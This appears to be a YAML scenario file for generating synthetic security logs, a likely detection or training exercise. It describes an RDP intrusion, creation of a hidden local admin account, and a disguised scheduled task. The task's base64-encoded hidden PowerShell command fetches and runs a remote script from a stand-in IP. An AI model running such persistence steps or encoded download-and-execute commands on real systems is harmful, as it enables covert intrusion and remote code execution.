  network:
    public_cidrs:
    - 192.0.2.96/28
    segments:
    - name: workstations
      cidr: 10.54.10.0/24
      exposure: internal
      systems:
      - WS-MSANTOS-01
      - WS-EBROOKS-01
      - WS-KITO-01
      - WS-RMOSS-01
    - name: servers
      cidr: 10.54.20.0/24
      exposure: internal
      systems:
      - DC-BLU-01
      - FILE-BLU-01
      - PROXY-BLU-01
    sensors:
    - type: network
      name: core-span
      hostname: ZEEK-CORE
      monitoring_segments:
      - workstations
      - servers
      direction: bidirectional
      placement: span
      log_formats:
      - zeek
time_window:
  start: '2026-09-29T13:00:00Z'
  duration: 2h
  warmup: 1h
generation_seed: 8217
baseline_activity:
  description: Quiet afternoon
  intensity: low
  variation: low
  suspicious_noise: low
observation_profile: complete
storyline:
- id: rdp
  time: +43m
  actor: ken.ito
  system: WS-EBROOKS-01
  activity: RDP from external IP
  events:
  - type: rdp_session
    source_ip: 203.0.113.133
- id: persist
  time: +47m
  actor: ken.ito
  system: WS-EBROOKS-01
  activity: Local admin + hidden PowerShell task
  events:
  - type: account_created
    target_username: svc_update
  - type: group_member_added
    group_name: Administrators
    member_name: svc_update
    scope: local
  - type: scheduled_task_created
    task_name: \Microsoft\Windows\HealthCheck
    task_content: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwAyADAAMwAuADAALgAxADEAMwAuADEAMwAzAC8AYQAuAHAAcwAxACkA
output:
  logs:
  - format: windows_event_security
  - format: windows_event_sysmon
  - format: zeek_conn
  - format: zeek_dns
  - format: zeek_ssl
  - format: proxy_access
  destination: out/T217
  compression: false
